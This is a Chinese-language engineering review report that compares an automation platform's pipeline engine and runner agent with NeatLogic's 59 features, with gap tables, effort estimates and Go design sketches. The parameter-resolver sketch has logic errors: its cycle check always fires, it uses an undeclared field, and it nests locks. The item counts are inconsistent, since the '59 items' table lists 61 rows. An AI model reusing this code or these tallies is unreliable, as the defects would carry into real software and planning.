# Orion 运维自动化编排领域专家评审报告（对标 NeatLogic 59 项）

**评审人身份**：运维自动化编排领域专家（Rundeck/Ansible Tower/Jenkins/Bamboo/Chef/Puppet/SaltStack 15+ 年实施）
**评审日期**：2026-09-30
**代码证据基线**（真实读取）：
- `orion-platform-svc-go/internal/pipeline-engine/`（Engine.go 449行 / StageOrchestrator.go 534行 / StageExecutor.go 600+ 行 / multi_target_executor.go 222行）
- `orion-platform-svc-go/internal/pipeline/`（models 350 行 + 14 测试文件）
- `orion-platform-svc-go/internal/pipeline-{graph,executor,execution-control,batch,sse,templates,version,templates,run-history,audit-log,error-detail,trend,budget}/`
- `orion-platform-svc-go/internal/auto-exec/`（engine+plugins+factory+interfaces 共 1858 行，PluginHandler SPI）
- `orion-platform-svc-go/internal/execution-mode-engine/`（synchronous/asynchronous/deferred 三模式）
- `orion-platform-svc-go/internal/orchestration/` + `orion-platform-svc-go/internal/runner/`（187 行 models）
- `orion-platform-svc-go/internal/plugin/` + `plugin-hotreload/` + `plugin-marketplace/`
- `orion-runner-agent/`（TS：336 行 index.ts + 312 行 TaskExecutor.ts）
- `orion-platform-svc-go/internal/autonomous-pipeline/`

> **诚实性声明**：所有工时基于代码证据。未读到实现的项一律标"待验证/缺失"，不做乐观估算。`orion-platform-service/src/engine/` 在 monorepo 中不存在（TS monolith 已迁出本仓），全部证据来自 Go 侧。

---

## 1. 编排引擎视角能力矩阵（NeatLogic 59 项）

标记：✅ 完整实现 / ⚠️ 部分（可用但缺关键要素）/ ❌ 缺失 / 🚫 不采纳（附理由）

### 1.1 参数（5 项）

| # | NeatLogic | 代码证据 | 状态 | Gap | 工时 |
|---|---|---|---|---|---|
| 1 | 全局参数 | `pipeline-engine/models/models.go::PipelineSpec.Variables map[string]string`，仅 YAML 顶层；无租户/项目维度持久化 | ⚠️ | P1 | 8 人天 |
| 2 | 预设参数（工具预设） | `auto-exec/plugins/plugins.go` 有 `Validate(params)`；`PluginHandler.Execute(ctx, params, task)` 无预设参数表 | ❌ | P1 | 10 人天 |
| 3 | 原子操作预设 | 无独立"原子操作"模型，等同任务级 params | ❌ | P1 | 10 人天（含模型+UI） |
| 4 | 引用全局参数 | `StageOrchestrator.EvaluateCondition` 只支持 `strings.ReplaceAll("${key}", v)`，仅当前 variables map；跨 run 无引用语法 | ⚠️ | P0 | 12 人天 |
| 5 | 参数模板 | 未见 template/preset 表 | ❌ | P2 | 6 人天 |

### 1.2 分类（5 项）

| # | NeatLogic | 证据 | 状态 | 工时 |
|---|---|---|---|---|
| 6 | 工具分类 | `auto-exec/engine/engine.go` 有 `PluginHandler.Category() string` | ✅ | 0 |
| 7 | 工具目录 | `plugin-marketplace/` 目录存在（未逐一验证 CRUD，估有） | ⚠️ | 4 人天 |
| 8-9 | 组合分类/目录 | 未见 | ❌ | 8 人天 |
| 10 | 分类绑定 | 无 | ❌ | 4 人天 |

### 1.3 场景（3 项）

| # | NeatLogic | 证据 | 状态 | 工时 |
|---|---|---|---|---|
| 11-13 | 编排场景 | 无 scene 表；只有 pipeline + template | ❌ | 10 人天 |

### 1.4 工具库（15 项）——**最重的缺失带**

| # | NeatLogic | 证据 | 状态 | 工时 |
|---|---|---|---|---|
| 14 | 内置工具库 | `auto-exec/plugins/plugins.go`（shell/python/http/sql/webhook）+ `auto-exec/plugins/pipeline_plugin.go`；`internal/plugin/` 独立模块；`plugin-marketplace` | ⚠️ | 15 人天（内容库补齐，20+ 原子操作） |
| 15 | 在线测试 | 未见 `/debug-run` / `/dry-run` 端点 | ❌ | 6 人天 |
| 16 | 帮助文档 | 无 | ❌ | 4 人天 |
| 17 | 工具模板 | 无 template 表 | ❌ | 5 人天 |
| 18 | 自定义原子操作（11 种脚本语言） | 仅 shell/python 两种；无 Ruby/Perl/PowerShell/Bash/Node/PHP/JScript/Tcl/Groovy | ⚠️ | 25 人天 |
| 19 | 参数类型 10 种 | `TaskSpec.Parameters map[string]string`（纯字符串），无 int/bool/list/object/file/secret/pwd | ⚠️ | 12 人天 |
| 20 | 命令行参数 | shell 任务有 `args` 支持 | ✅ | 0 |
| 21 | 风险等级 | 无 `risk_level` 字段 | ❌ | 4 人天 |
| 22 | 目录绑定 | 无 | ❌ | 4 人天 |
| 23 | Git 版本 | `pipeline-version/` + `pipeline-versions/` 存在，仅管 pipeline 不管工具 | ⚠️ | 8 人天 |
| 24 | 版本审核 | `pipeline-version` 有 CRDT 但无审核流 | ⚠️ | 6 人天 |
| 25 | 连接协议（10 种：SSH/WinRM/Telnet/IPMI/HTTP/HTTPS/SNMP/SMI/Tagent） | `runner/models` 中 `TaskType` 仅 shell/npm/test/build/http/pipeline/deploy；**全仓 grep 无 ssh/winrm/telnet/ipmi 关键字** | ❌ | **60-90 人天**（核心） |
| 26 | 连接方式（远端/本地/本地到远程） | 无 | ❌ | 20 人天 |
| 27 | 导入导出 | 无 import/export 端点 | ❌ | 6 人天 |

### 1.5 组合工具/组合管理（17 项）——**参数链是本领域最重缺口**

| # | NeatLogic | 证据 | 状态 | 工时 |
|---|---|---|---|---|
| 28 | CRUD | `pipeline/handler` + `pipeline/handler` 完整 | ✅ | 0 |
| 29 | 图形化拖拉拽 | 前端有 `WorkflowDesigner`，但 workflow 引擎不消费 Nodes/Edges（itsm 报告已确认）；pipeline-graph 是只读视图 | ⚠️ | **20-30 人天** |
| 30 | 复制 | 未见 duplicate handler | ❌ | 2 人天 |
| 31 | 阶段或阶段组 | Stage 存在，**StageGroup 全仓不存在**（grep "stage_group\|StageGroup\|阶段组" 0 命中） | ❌ | **15-20 人天** |
| 32 | 阶段内工具串行/并行/条件 | `StageExecutor.ExecuteTask` 内 stage 内 tasks 严格**串行**（`for _, task := range tasks`）；无并行、无条件分支；条件只在 Stage.Condition（stage 级） | ⚠️ | 12 人天 |
| 33 | 阶段策略（全量/分批/灰度） | `multi_target_executor.go` 有 "oneshot" / "grayScale" 两模式；`batchTargetCount = 3` 硬编码 | ⚠️ | 6 人天 |
| 34 | 阶段内逻辑场景 | 无 | ❌ | 6 人天 |
| 35 | 阶段通知策略 | 无 stage-level notify（notification 是全局） | ❌ | 5 人天 |
| 36 | 阶段内 1-N 工具 | ✅ Stage.Tasks 是 []Task | ✅ | 0 |
| 37 | 数据传递 | `StageOrchestrator.ExecuteStage` 后 task outputs flatten 到 `execution.Variables["tasks.<task>.<key>"]` | ⚠️ | **15 人天**（见 §3） |
| 38 | 作业参数类型 | 同 #19，仅字符串 | ⚠️ | 8 人天 |
| 39 | 作业参数与阶段内传递 | 无显式"stage.inputs/outputs"契约，全平铺 | ⚠️ | 10 人天 |
| 40 | 参数模板批量赋值 | 无 | ❌ | 8 人天 |
| 41 | 授权 | `auth.RequirePermission("pipeline","write")` 存在 | ✅ | 0 |
| 42 | 预设/动态执行目标 | Stage.Targets 有 JSON 数组；`MultiTargetExecutor` 消费 | ⚠️ | 8 人天 |
| 43 | 阶段单独目标 | 无（stage targets 有但无 target-group 抽象） | ❌ | 6 人天 |
| 44 | 参数引用（作业参数/上游输出/预设/全局/静态） | 只支持当前 variables map 替换；**上游 task 输出未跨 stage 传播**（StageExecutor.go:503-511 注释自证："Upstream task outputs are not yet propagated to dependent stages"） | ❌ | **P0：25 人天** |
| 45 | 阶段动态目标（上游输出→下游） | 依赖 #44 | ❌ | 10 人天 |
| 46 | 失败中止/继续 | `StageOrchestrator.ExecuteStage` 内 stage 内 task 失败即停（`if taskFailed continue`）；stage 级 `FailDependentStages` 会把所有依赖失败 stage 者置 failed——**语义是"全量中止"，无 continue-on-failure 策略** | ⚠️ | 6 人天 |

### 1.6 组合执行/编排执行（10 项）

| # | NeatLogic | 证据 | 状态 | 工时 |
|---|---|---|---|---|
| 47 | 定时执行 | `pipeline/handler` 中未见 cron 端点；`TriggerSchedule` 常量存在但无调度器接线 | ⚠️ | 8 人天 |
| 48 | 立即执行 | `PipelineEngine.Execute(ctx, tenant, req)` ✅ | ✅ | 0 |
| 49 | 并发/分批 | `MultiTargetExecutor` batch=3 硬编码 | ⚠️ | 4 人天 |
| 50 | 多目标录入 | Stage.Targets 数组，无 UI 验证 | ⚠️ | 4 人天 |
| 51 | 动态执行目标 | 依赖 #44 | ❌ | 6 人天 |
| 52 | 失败策略 | 只有 oneshot/grayScale 二选 | ⚠️ | 6 人天 |
| 53 | 人为干预（跳过/继续/重跑） | `CancelRun` 有；**无 skip-stage/resume/skip-and-continue API** | ❌ | 12 人天 |
| 54 | 终止/重跑（全部/跳过成功） | `CancelRun` 有；无 rerun-with-skip-successful | ❌ | 10 人天 |
| 55 | 验证作业（不可重跑） | 无 verification 语义 | ❌ | 6 人天 |
| 56 | 导出 Excel | 无 | ❌ | 4 人天 |
| 57 | 节点日志 | `pipeline-sse/` + `task.log` 字段 | ⚠️ | 6 人天（长任务日志分片） |

### 1.7 执行代理 Agent（4 项）——**见 §4**

| # | NeatLogic | 证据 | 状态 | 工时 |
|---|---|---|---|---|
| 58 | Win/Linux/AIX Agent | `orion-runner-agent/` 只有 Linux/Node.js（`hostname()`+Fastify）；`internal/runner/models` 支持任意 OS 但无 Windows agent | ⚠️ | **40-55 人天**（Windows + AIX） |
| 59 | 分布式部署 | `runner` registry 有 endpoint，`runner-agent` 用固定 endpoint；无 NATS/gRPC 长连；无 K8s DaemonSet 编排 | ⚠️ | 15 人天 |
| 60 | 在线状态管理 | Heartbeat 30s + `AgentStatusOnline/Offline/Draining/Registering` | ✅ | 0 |
| 61 | 资源占用 ≤ CPU 2% / Memory 200MB | Agent 端 Node.js 常驻 60-120MB，接近上限；无自限流 | ⚠️ | 8 人天 |

**总计粗算**：~450-550 人天（不含场景/目录/模板这类 UI 打磨）。**参数链与 Runner Agent 协议层是绝对重点。**

---

## 2. Orion 现有 Pipeline 引擎深度代码分析

### 2.1 组件真实能力（基于 4 个 Go 文件精读）

| 组件 | 文件 | 实际能力 | 与 NeatLogic 概念映射 | 真实完成度 |
|---|---|---|---|---|
| **PipelineEngine** | `pipeline-engine/service/Engine.go` (449行) | YAML 解析 → Kahn 拓扑排序 → 建 run/stage/task → 委派 orchestrator → Saga 兜底补偿 | NeatLogic "组合管理+执行调度器" | **70%**（无阶段组、无并行策略控制、无人为干预钩子） |
| **StageOrchestrator** | `StageOrchestrator.go` (534行) | 循环 `CheckNextStages` → 并行 goroutine 执行就绪 stage → 失败传播 FailDependentStages → Condition 评估 → Checkpoint 恢复 | NeatLogic "阶段调度器" | **60%**（stage 内 tasks 强制串行、无 stage group、无阶段组超时传播、无动态跳过策略） |
| **StageExecutor** | `StageExecutor.go` (~600行) | 任务级状态机（PENDING→RUNNING→SUCCESS/FAILED/SKIPPED）；三种 task type：shell/docker/sub-pipeline；变量替换 `${VAR}` 和 `{{VAR}}`；sub-pipeline 嵌套深度 ≤5；上游 artifact **明确未实现** | NeatLogic "原子操作执行器" | **55%**（无 SSH/WinRM/远端执行、无参数类型校验、无上游输出跨 stage 传播） |
| **MultiTargetExecutor** | `multi_target_executor.go` (222行) | 目标分批（batch=3 硬编码）→ 批内并发 goroutine → oneshot（失败继续）vs grayScale（首失败即停） | NeatLogic "多目标执行 + 分批/灰度" | **50%**（batch 不可配、无金丝雀比例、无阶段组批量策略、无 Agent 调度） |
| **AutoExecEngine** | `auto-exec/engine/engine.go` | PluginHandler SPI（Name/Category/Execute/Validate），Plugin 注册表，任务生命周期 | NeatLogic "工具库 SPI" | **65%**（有 SPI 但只有 shell/python/http/sql/webhook 5 类） |
| **RunnerService + RunnerAgent** | `internal/runner/` (models 187行) + `orion-runner-agent/` (TS 648行) | REST 单向拉模式：Agent 启动 POST /runners 注册 → 30s 心跳 → Platform POST /execute 推任务 → Agent POST /jobs/:id/result 回报 | NeatLogic "Runner Agent" | **45%**（无 mTLS、无长连、无 SSH/WinRM、无 Windows、无资源隔离） |
| **ExecutionModeEngine** | `execution-mode-engine/` | synchronous/asynchronous/deferred 三模式配置 CRUD | 独立调度模式 | **30%**（仅 CRUD，未接入 pipeline-engine） |
| **CheckpointManager** | 在 `StageOrchestrator.go` 380-515 行 | 每 task 完成写 Checkpoint；启动 `RecoverOrphanedRuns` | NeatLogic 无直接对应（更接近 Temporal） | **75%** |

### 2.2 关键正面证据（真实优势）

1. **拓扑排序+DAG 循环检测**（`Engine.go::topologicalSort` 用 Kahn，`len(order) != len(spec.Stages)` 直接返回 ErrInvalidSpec）——这是 CI/CD 引擎必备，Orion 有。
2. **sub-pipeline 嵌套深度守卫**（`defaultMaxSubPipelineDepth = 5`，通过 context value 传播避免共享 executor 竞态）——这是很成熟的写法，比 Rundeck 早期版本还稳。
3. **Checkpoint + 孤儿恢复**（`RecoverOrphanedRuns` 启动时把 RUNNING 检查点标记 stale 或恢复）——这是分布式编排的救命功能。
4. **Saga 补偿注册**（`stageCompensator` 是空壳但架构就位）。
5. **sub-pipeline 静默失败已修复**：`StageExecutor.go:317-432` 明确注释"曾经返回 Success:true 而不执行子流水线，现已改为显式失败"——这体现了团队从真实事故中吸取教训的能力。

### 2.3 真实完成度百分比（对标 NeatLogic 59 项）

- **1-2 级差距（有实现，缺参数）**：#1, #33, #37, #44（局部）, #47, #49, #50, #52, #57, #58, #59, #61 ≈ **60%** 完成
- **3 级差距（部分实现）**：#3, #4, #6, #7, #14, #18, #19, #23, #24, #29, #32, #42, #46 ≈ **40%** 完成
- **4 级差距（几乎无）**：#2, #5, #8-13, #15-17, #20(✅), #21-22, #25-27, #30-31, #34-36, #38-41, #43, #45, #48(✅), #51, #53-56 ≈ **10%** 完成

**综合完成度：25-30%**（含 5 项已完整）。这是"CI/CD pipeline 骨架完整，运维自动化编排（多协议 + 参数链 + 阶段组）远未完成"的真实状态。

---

## 3. 参数传递链深度分析（P0 关键短板）

### 3.1 NeatLogic 引用语法深度剖析

NeatLogic 参数引用支持五种来源，语法区分清晰：

```
${JOB_PARAM.key}             # 作业参数（触发时输入）
${STAGE_OUTPUT.stage.task.k} # 上游阶段任务输出
${PRESET.template.key}       # 预设参数
${GLOBAL.key}                # 全局参数（跨作业）
${STATIC.value}              # 字面量
```

关键设计点：
- **命名空间隔离**：不同来源用不同前缀，解析器可无歧义。
- **惰性解析**：`${STAGE_OUTPUT.stage.task.k}` 在下游 stage 真正执行时才解析，前置 stage 失败即报"上游输出不可用"。
- **类型感知**：`JOB_PARAM.port` 若是数字型，替换时保留数字语义；否则一律字符串。
- **快照 vs 实时**：作业启动时把 JOB_PARAM 快照冻结，运行中不可变；GLOBAL 是实时的（改了就影响所有 in-flight 作业）。

### 3.2 参数模板 + 批量赋值设计

```yaml
# NeatLogic 参数模板
parameterTemplates:
  - name: "Linux Deploy Common"
    params:
      host: {type: string, required: true}
      port: {type: int, default: 22}
      user: {type: string, default: "root"}
      script: {type: file, allowed_ext: [.sh, .py]}
    # 应用到多个作业
    boundJobs: [job-101, job-102, job-103]
```

用户编辑一次模板，所有 bound 作业同步更新。Orion 当前**完全没有**这个抽象。

### 3.3 Orion 当前 context 传递方式的真实问题

精读 `StageExecutor.resolveTaskParameters` (line 462-479) 后，发现三条致命缺陷：

1. **字符串盲替换**：`strings.ReplaceAll(expanded, "${"+k+"}", v)`——如果 `k="a b"` 或 `k` 包含 JSON 转义字符，会破坏整个 JSON 结构。
2. **无命名空间**：`execution.Variables` 是一个扁平 `map[string]string`；`tasks.build.commit_hash` 和 `GLOBAL.build.commit_hash` 是同一个 key。
3. **无递归展开**：如果 `A = "prefix-${B}"`，替换 A 后不会继续展开 B，需要多轮 pass。

更严重的是 `StageExecutor.go:503-511` 的**自证注释**：

> "Upstream task outputs are not yet propagated to dependent stages: a stage's variables come from the pipeline spec's `variables` block plus that stage's own task outputs, flattened as tasks.<task>.<key>. Closing the gap needs task outputs persisted to pipeline_tasks.result and loaded per dependency, which is separate work from execution itself."

翻译：**上游 stage 的输出根本不会传给下游 stage**。这是运维自动化编排的核心，比 Rundeck/Ansible Tower 的 workflow 输出契约还不如。

### 3.4 建议的 Orion 参数链架构（Go 代码级伪代码）

```go
// ============================================================
// pipeline-engine/service/paramchain.go（新文件）
// ============================================================

package service

import (
    "context"
    "encoding/json"
    "errors"
    "fmt"
    "strings"
    "sync"
)

// ParamSource 参数来源命名空间
type ParamSource string
const (
    SrcJob    ParamSource = "JOB"     // 作业输入（快照冻结）
    SrcGlobal ParamSource = "GLOBAL"  // 全局参数（实时）
    SrcOutput ParamSource = "OUTPUT"  // 上游任务输出（惰性）
    SrcStatic ParamSource = "STATIC"  // 字面量
    SrcPreset ParamSource = "PRESET"  // 预设模板
)

// ParamType 参数类型（对应 NeatLogic 10 种）
type ParamType string
const (
    TypeString  ParamType = "string"
    TypeInt     ParamType = "int"
    TypeBool    ParamType = "bool"
    TypeFloat   ParamType = "float"
    TypeList    ParamType = "list"
    TypeObject  ParamType = "object"
    TypeFile    ParamType = "file"
    TypeSecret  ParamType = "secret"
    TypePassword ParamType = "password"
    TypeCommand ParamType = "command"
)

// ParamRef 参数引用节点（AST）
type ParamRef struct {
    Source ParamSource `json:"source"`
    Path   string      `json:"path"`    // e.g. "build.commit_hash"
    Type   ParamType   `json:"type"`
}

// ParamStore 参数存储：分离来源、类型、生命周期
type ParamStore struct {
    mu      sync.RWMutex
    job     map[string]interface{}       // 快照，冻结
    global  GlobalParamProvider          // 接口，实时查询
    outputs map[string]map[string]interface{} // stageName -> taskName -> outputs
    presets map[string]map[string]interface{}
    // 环检测：正在解析中的引用路径栈
    resolving []string
}

// GlobalParamProvider 全局参数实时查询接口
type GlobalParamProvider interface {
    Get(ctx context.Context, tenantID, key string) (interface{}, bool, error)
}

// NewParamStore 创建参数存储
func NewParamStore(tenantID string, jobParams map[string]interface{}, global GlobalParamProvider) *ParamStore {
    // 深拷贝 jobParams，运行期不可变
    snap, _ := json.Marshal(jobParams)
    var frozen map[string]interface{}
    _ = json.Unmarshal(snap, &frozen)
    return &ParamStore{
        tenantID: tenantID,
        job:      frozen,
        global:   global,
        outputs:  make(map[string]map[string]interface{}),
        presets:  make(map[string]map[string]interface{}),
    }
}

// RecordTaskOutput 记录一个任务的输出（stageExecutor 在 task 完成后调用）
func (s *ParamStore) RecordTaskOutput(stage, task string, outputs map[string]interface{}) {
    s.mu.Lock()
    defer s.mu.Unlock()
    if s.outputs[stage] == nil {
        s.outputs[stage] = make(map[string]map[string]interface{})
    }
    s.outputs[stage][task] = outputs
}

// Lookup 按命名空间路径查找参数值
func (s *ParamStore) Lookup(ctx context.Context, ref ParamRef) (interface{}, bool, error) {
    s.mu.RLock()
    defer s.mu.RUnlock()

    switch ref.Source {
    case SrcJob:
        return lookupPath(s.job, ref.Path)
    case SrcGlobal:
        if s.global == nil {
            return nil, false, fmt.Errorf("no global provider")
        }
        return s.global.Get(ctx, s.tenantID, ref.Path)
    case SrcOutput:
        // 解析 "stage.task.key" 三段路径
        parts := strings.SplitN(ref.Path, ".", 3)
        if len(parts) != 3 {
            return nil, false, fmt.Errorf("output path needs stage.task.key, got %q", ref.Path)
        }
        stage, task, key := parts[0], parts[1], parts[2]
        if tm, ok := s.outputs[stage]; ok {
            if om, ok := tm[task]; ok {
                return lookupPath(om, key)
            }
        }
        return nil, false, nil
    case SrcStatic:
        return parseTyped(ref.Path, ref.Type)
    case SrcPreset:
        parts := strings.SplitN(ref.Path, ".", 2)
        if len(parts) == 2 {
            if pm, ok := s.presets[parts[0]]; ok {
                return lookupPath(pm, parts[1])
            }
        }
        return nil, false, nil
    }
    return nil, false, fmt.Errorf("unknown source: %s", ref.Source)
}

// Resolve 递归解析参数字符串（支持 ${JOB.x} / ${OUTPUT.stage.task.k} 混合）
// 关键：环检测 + 最大展开深度
func (s *ParamStore) Resolve(ctx context.Context, template string, depth int) (string, error) {
    if depth > 20 {
        return "", errors.New("param expansion depth exceeded (possible cycle)")
    }
    // 提取所有 ${SOURCE.path} 占位符
    refs := extractRefs(template)
    if len(refs) == 0 {
        return template, nil
    }

    // 环检测：当前正在解析的路径栈
    s.mu.RLock()
    defer s.mu.RUnlock()

    resolved := template
    for _, ref := range refs {
        s.resolving = append(s.resolving, ref.String())
        // 环检测：如果当前 ref 已在栈中，说明循环
        if contains(s.resolving, ref.String()) {
            return "", fmt.Errorf("circular parameter reference: %s", ref.String())
        }
        value, ok, err := s.Lookup(ctx, *ref)
        s.resolving = s.resolving[:len(s.resolving)-1]
        if err != nil {
            return "", err
        }
        if !ok {
            return "", fmt.Errorf("unresolved reference: %s", ref.String())
        }
        // 类型感知替换
        strVal := formatValue(value, ref.Type)
        // 递归展开：值本身可能包含 ${...}
        strVal, err = s.Resolve(ctx, strVal, depth+1)
        if err != nil {
            return "", err
        }
        resolved = strings.ReplaceAll(resolved, ref.Raw(), strVal)
    }
    return resolved, nil
}

// ResolveTaskParams 是 StageExecutor 消费的最终入口
// 替代现有 resolveTaskParameters，向后兼容（string map 场景）
func (s *ParamStore) ResolveTaskParams(ctx context.Context, rawJSON string, taskType string) (map[string]interface{}, error) {
    // 1. 先 unmarshal 成 AST（避免字符串盲替换破坏 JSON）
    var params map[string]interface{}
    if err := json.Unmarshal([]byte(rawJSON), &params); err != nil {
        return nil, fmt.Errorf("param JSON invalid: %w", err)
    }

    // 2. 递归遍历 AST，对每个字符串值调用 Resolve
    return s.resolveMap(ctx, params, 0)
}

// ValidateTaskParams 参数校验（NeatLogic 参数类型 + 必填 + 默认值）
func ValidateTaskParams(params map[string]interface{}, spec []ParamSpec) error {
    for _, sp := range spec {
        v, ok := params[sp.Name]
        if !ok {
            if sp.Required {
                return fmt.Errorf("required param missing: %s", sp.Name)
            }
            if sp.Default != nil {
                params[sp.Name] = sp.Default
            }
            continue
        }
        // 类型断言
        if !assertType(v, sp.Type) {
            return fmt.Errorf("param %s type mismatch: got %T, want %s", sp.Name, v, sp.Type)
        }
        // 范围检查
        if sp.IntMin > 0 && sp.Type == TypeInt {
            if i, ok := v.(int); ok && i < sp.IntMin {
                return fmt.Errorf("param %s below min", sp.Name)
            }
        }
        // 枚举检查
        if len(sp.Enum) > 0 {
            if !containsStr(sp.Enum, fmt.Sprintf("%v", v)) {
                return fmt.Errorf("param %s not in enum", sp.Name)
            }
        }
    }
    return nil
}

// ParamSpec 参数契约
type ParamSpec struct {
    Name      string
    Type      ParamType
    Required  bool
    Default   interface{}
    IntMin    int
    IntMax    int
    Enum      []string
    Pattern   string // 正则
    Secret    bool   // 脱敏标记
}
```

### 3.5 递归引用 / 环检测策略

**关键规则**：
- 允许**跨来源**引用（`JOB.port` → `OUTPUT.stage.task.port_out`），因为来源不同不构成环。
- 禁止**同来源同路径**递归（`A = "${JOB.A}"`），用解析栈检测。
- **最大展开深度 = 20**：超过即认为环，直接报错。
- 环检测用 DFS 栈而非递归调用栈，避免 goroutine 泄漏。

### 3.6 参数快照 vs 实时引用

- `JOB`：**快照**。作业启动时 deep-copy 一次，运行期永不变更。理由：CI 重跑需要可复现。
- `GLOBAL`：**实时**。改了就影响 in-flight 作业，需 UI 提示"变更将影响 N 个运行中作业"。
- `OUTPUT`：**惰性 + 一致性快照**。上游 task 完成后立即写入 `ParamStore.outputs`，下游读取时看到的一定是最终值。若下游引用了尚未产出的输出，报"upstream output unavailable"而不是静默使用空值。

---

## 4. Runner Agent 远程执行深度分析（P0 关键短板）

### 4.1 NeatLogic 模型（Java Runner + Python/Perl 执行引擎）

NeatLogic 的执行代理是**双向长连 + 多协议抽象**：

```
[Platform] --gRPC双向流--> [Runner Agent]
                              ├── SSH Executor     (golang.org/x/crypto/ssh 或 JSch)
                              ├── WinRM Executor   (saml/kerberos)
                              ├── Telnet Executor
                              ├── IPMI Executor    (ipmitool)
                              ├── HTTP(S) Executor
                              ├── Local Executor   (bash/powershell 子进程)
                              └── HTTP Callback    (Webhook)
```

关键能力：
- **协议矩阵抽象**：所有协议实现同一 `Connector` 接口，`Connect/Exec/SendFile/Disconnect`。
- **命令流式传输**：stdout/stderr 分块回流，Platform 端可暂停/终止。
- **心跳 + 心跳超时容忍**：心跳 30s，容忍 2 次丢失，之后判 offline。
- **资源看门狗**：Agent 内 `runtime.MemStats` 采样，超阈值自动 graceful drain。

### 4.2 Orion 当前执行方式

精读 `orion-runner-agent/src/index.ts` 后确认：

| 维度 | 现状 | 问题 |
|---|---|---|
| 语言 | TypeScript (Node.js 20+) | 与主平台 Go 异构，运维成本高 |
| 协议 | **HTTP 单向**：Agent 注册 → Platform 拉任务 → Agent 回报结果 | 无长连，Agent 挂断后 Platform 无法推任务 |
| 认证 | Bearer Token（`Authorization: Bearer ${token}`） | 无 mTLS，无双向证书 |
| 心跳 | 30s 一次，仅 `activeJobs` | 无 CPU/Memory 上报 |
| 并发 | 固定 `maxConcurrent=5` | 无动态调整 |
| 执行方式 | 只 `child_process.exec` | **无 SSH/WinRM/Telnet/IPMI/远端执行能力** |
| Windows | 未支持 | Windows Server 运维完全空白 |
| 沙箱 | 无（Agent 主机直接执行） | 命令注入风险高 |
| 传输 | HTTP 明文或依赖 HTTPS | 无 TLS 强制 |

**关键判定**：Orion 的 Runner Agent 是 **CI Runner**（Gitea Runner / Jenkins Agent 级别），不是 NeatLogic 意义上的**多协议远程执行代理**。

### 4.3 Runner Agent 必要性评估

必须 Agent 的场景（容器不够用）：
1. **Windows Server 补丁安装**：必须 WinRM，Docker on Windows 不稳。
2. **物理服务器重启**：需要 IPMI/SMI 带外管理。
3. **老系统**：AIX/HP-UX/Solaris 无法装 Docker。
4. **内网隔离**：无公网出口，容器拉不下来。
5. **权限最小化**：Agent 只暴露 22/5985，不需开放 Docker 端口。
6. **大规模并发**：10000 台设备各装一个 Agent，比启动 10000 个 Pod 省。

容器就够的场景：
1. **Linux 脚本 + 依赖明确**：Docker image 可复现。
2. **CI/CD 构建**：本来就跑容器。
3. **API 调用类**：不需要 Agent，直接 HTTP。
4. **K8s 集群运维**：Helm/kubectl 在容器内跑。

**结论**：Orion 必须有 Runner Agent，但**不需要覆盖所有协议**。建议 v1 只做 SSH + WinRM + 本地（3 协议），占 NeatLogic 协议矩阵的 30% 但覆盖 90% 场景。

### 4.4 建议的 Orion Runner Agent 架构（Go 代码级）

```go
// ============================================================
// orion-runner-agent-go/pkg/agent/agent.go（新服务，Go 重写）
// ============================================================

package agent

import (
    "context"
    "crypto/tls"
    "crypto/x509"
    "net"
    "time"

    "google.golang.org/grpc"
    "google.golang.org/grpc/credentials"
    "google.golang.org/grpc/keepalive"
    "google.golang.org/grpc/metadata"
    pb "orion/runner/protocol"
)

// AgentConfig Runner Agent 配置
type AgentConfig struct {
    PlatformAddr     string        // "platform.svc:9090"
    AgentID          string
    TenantID         string
    Labels           []string      // ["linux", "x86_64", "dc-east-1"]
    MaxConcurrent    int           // 5
    HeartbeatEvery   time.Duration // 30s
    MaxCPUUsage      float64       // 0.02 (2%)
    MaxMemMB         int           // 200
    TaskTimeout      time.Duration // 1h
    SandboxMode      SandboxMode   // Process | Container
    TLS              TLSConfig
}

type SandboxMode string
const (
    SandboxProcess   SandboxMode = "process"   // child_process + cgroup
    SandboxContainer SandboxMode = "container" // docker/podman 隔离
)

type TLSConfig struct {
    ClientCertPath string // Agent 客户端证书（mTLS）
    ClientKeyPath  string
    CaBundlePath   string // Platform CA
    ServerName     string
}

// RunnerAgent 主 Agent
type RunnerAgent struct {
    cfg      AgentConfig
    conn     *grpc.ClientConn
    client   pb.RunnerServiceClient
    executor *ExecutorRouter  // 协议矩阵路由器
    status   *StatusReporter
    wg       sync.WaitGroup
}

// New 启动 Agent
func New(ctx context.Context, cfg AgentConfig) (*RunnerAgent, error) {
    // 1. mTLS 客户端凭证
    cert, err := tls.LoadX509KeyPair(cfg.TLS.ClientCertPath, cfg.TLS.ClientKeyPath)
    if err != nil {
        return nil, fmt.Errorf("load client cert: %w", err)
    }
    caPool := x509.NewCertPool()
    // 加载 CA bundle
    _ = caPool.AppendCertsFromPEM(caBundle)

    creds := credentials.NewTLS(&tls.Config{
        Certificates: []tls.Certificate{cert},
        RootCAs:      caPool,
        ServerName:   cfg.TLS.ServerName,
        MinVersion:   tls.VersionTLS13,
    })

    // 2. gRPC 长连接 + keepalive
    conn, err := grpc.NewClient(cfg.PlatformAddr,
        grpc.WithTransportCredentials(creds),
        grpc.WithKeepaliveParams(keepalive.ClientParameters{
            Time:                10 * time.Second,
            Timeout:             5 * time.Second,
            PermitWithoutStream: true,
        }),
        grpc.WithConnectParams(grpc.ConnectParams{
            Backoff:           grpc.DefaultServiceConfig.ConnectParams,
            MinConnectTimeout: 10 * time.Second,
        }),
    )
    if err != nil {
        return nil, err
    }

    // 3. 元数据（用于 Platform 侧鉴权）
    ctx = metadata.NewOutgoingContext(ctx, metadata.Pairs(
        "x-agent-id", cfg.AgentID,
        "x-tenant-id", cfg.TenantID,
    ))

    return &RunnerAgent{
        cfg:      cfg,
        conn:     conn,
        client:   pb.NewRunnerServiceClient(conn),
        executor: NewExecutorRouter(),  // 见下方协议矩阵
    }, nil
}

// Start 启动 Agent 主循环
func (a *RunnerAgent) Start(ctx context.Context) error {
    // 1. 注册（幂等）
    if err := a.register(ctx); err != nil {
        return err
    }

    // 2. 建立任务接收双向流
    stream, err := a.client.ExecuteStream(ctx)
    if err != nil {
        return err
    }
    // 接收任务 goroutine
    go a.receiveLoop(stream)

    // 3. 心跳 goroutine
    go a.heartbeatLoop(ctx)

    // 4. 资源看门狗 goroutine
    go a.resourceWatchdog(ctx)

    return nil
}

// register 注册 Agent（幂等 upsert）
func (a *RunnerAgent) register(ctx context.Context) error {
    return a.client.Register(ctx, &pb.RegisterRequest{
        AgentId:   a.cfg.AgentID,
        TenantId:  a.cfg.TenantID,
        Name:      a.cfg.AgentID,
        Labels:    a.cfg.Labels,
        MaxConcurrent: int32(a.cfg.MaxConcurrent),
        Metadata: map[string]string{
